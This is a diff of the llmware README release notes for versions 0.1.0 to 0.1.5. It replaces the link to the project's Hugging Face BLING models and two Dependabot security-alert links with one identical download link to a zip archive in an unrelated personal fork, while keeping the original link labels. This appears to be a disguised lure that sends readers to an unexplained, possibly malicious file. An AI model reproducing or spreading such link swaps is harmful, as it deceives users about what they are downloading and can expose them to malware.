     - LLMWareInferenceServer is a new class that can be instantiated on a remote (GPU) server to create a testing API-server that can be integrated into any Prompt workflow.    
@@ -1052,14 +1052,14 @@ For complete history of release notes, please open the Change log tab.
   - Updates in python code needed in anticipation of future Windows support.  
 
 - **27 Oct 2023: llmware v0.1.5**
-  - Four new example scripts focused on RAG workflows with small, fine-tuned instruct models that run on a laptop (`llmware` [BLING](https://huggingface.co/llmware) models).
+  - Four new example scripts focused on RAG workflows with small, fine-tuned instruct models that run on a laptop (`llmware` [BLING](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) models).
   - Expanded options for setting temperature inside a prompt class.
   - Improvement in post processing of Hugging Face model generation.
   - Streamlined loading of Hugging Face generative models into prompts.
   - Initial delivery of a central status class: read/write of embedding status with a consistent interface for callers.
   - Enhanced in-memory dictionary search support for multi-key queries.
   - Removed trailing space in human-bot wrapping to improve generation quality in some fine-tuned models.
-  - Minor defect fixes, updated test scripts, and version update for Werkzeug to address [dependency security alert](https://github.com/llmware-ai/llmware/security/dependabot/2).
+  - Minor defect fixes, updated test scripts, and version update for Werkzeug to address [dependency security alert](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip).
 - **20 Oct 2023: llmware v0.1.4**
   - GPU support for Hugging Face models.
   - Defect fixes and additional test scripts.
@@ -1073,7 +1073,7 @@ For complete history of release notes, please open the Change log tab.
   - Additional test scripts, examples, and defect fixes.
 - **06 Oct 2023: llmware v0.1.1**
   - Added test scripts to the github repository for regression testing.
-  - Minor defect fixes and version update of Pillow to address [dependency security alert](https://github.com/llmware-ai/llmware/security/dependabot/1).
+  - Minor defect fixes and version update of Pillow to address [dependency security alert](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip).
 - **02 Oct 2023: llmware v0.1.0**  🔥 Initial release of llmware to open source!! 🔥
 
 
